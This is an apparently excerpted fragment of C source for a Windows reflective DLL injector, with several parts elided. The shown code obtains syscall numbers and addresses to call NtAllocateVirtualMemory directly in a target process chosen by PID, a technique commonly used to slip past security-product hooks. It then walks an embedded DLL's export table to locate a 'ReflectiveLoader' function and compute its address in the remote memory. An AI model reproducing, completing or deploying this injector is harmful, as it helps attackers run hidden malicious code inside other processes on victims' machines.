...
DWORD RvaToOffset(PVOID pDllBytes, DWORD rva) {
...
VOID reflective_inject(DWORD pid) {
    ...
    printf("[+] Embedded DLL size: %lu bytes\n", dllSize);
    PVOID base = NULL;
    SIZE_T allocSize = dllSize;
    g_ssn = getSSN("NtAllocateVirtualMemory");
    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
    NTSTATUS status = iNtAllocateVirtualMemory(remote_proc, &base, 0, &allocSize,
    ...
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)pDllBytes + dos->e_lfanew);
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    DWORD exportOffset = RvaToOffset(pDllBytes, exportRVA);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDllBytes + exportOffset);
    DWORD* names = (DWORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfNames));
    DWORD* funcs = (DWORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfFunctions));
    WORD* ords = (WORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfNameOrdinals));
    printf("[+] Export count: %lu\n", exportDir->NumberOfNames);
    HANDLE thread_handle = NULL;
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, names[i]));
        if (strcmp(name, "ReflectiveLoader") == 0) {
            DWORD loaderRVA = funcs[ords[i]];
            DWORD loaderFileOffset = RvaToOffset(pDllBytes, loaderRVA);
            LPVOID reflectiveLoaderAddr = (LPVOID)((BYTE*)inject_addr + loaderFileOffset);
            printf("[+] loaderRVA: 0x%X loaderFileOffset: 0x%X\n", loaderRVA, loaderFileOffset);
